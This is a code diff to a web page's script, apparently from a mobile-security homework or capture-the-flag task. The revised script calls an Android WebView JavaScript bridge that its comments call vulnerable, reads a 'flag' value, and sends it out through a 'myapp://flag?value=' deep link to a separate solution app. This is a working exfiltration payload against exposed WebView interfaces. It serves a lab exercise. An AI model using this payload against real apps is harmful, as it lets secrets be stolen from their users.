@@ -8,18 +8,28 @@
   <div id="flagOutput">TEST TEXT</div>
 
   <script>
-    function tryGetFlag() {
-      try {
-        let result = Android.getdate("com.mobisys.hw4.task2.MainActivity.flag"); 
-        document.getElementById("flagOutput").innerText = result;
-        console.log("Got flag from Android interface:", result);
-      } catch (e) {
-        console.log("Android interface not ready, retrying...");
-        setTimeout(tryGetFlag, 250); 
-      }
-    }
-
-    tryGetFlag();
+    (function() {
+      setTimeout(function(){
+        try {
+          // Retrieve the flag using the vulnerable JavaScript interface.
+          var flagInfo = Android.getdate("flag");
+          // Update the page for debugging purposes.
+          var flagDiv = document.getElementById("flagOutput");
+          if (flagDiv) {
+            flagDiv.innerText = flagInfo;
+          } else {
+            document.write(flagInfo);
+          }
+          console.log("Flag from Android interface:", flagInfo);
+          // Redirect to our solution app via a deep link, carrying the flag.
+          window.location.href = "myapp://flag?value=" + encodeURIComponent(flagInfo);
+        } catch (e) {
+          console.error("Error executing Android.getdate:", e);
+          // Retry after a short delay if the interface isn’t ready.
+          setTimeout(arguments.callee, 250);
+        }
+      }, 0);
+    })();
   </script>
 </body>
 </html>
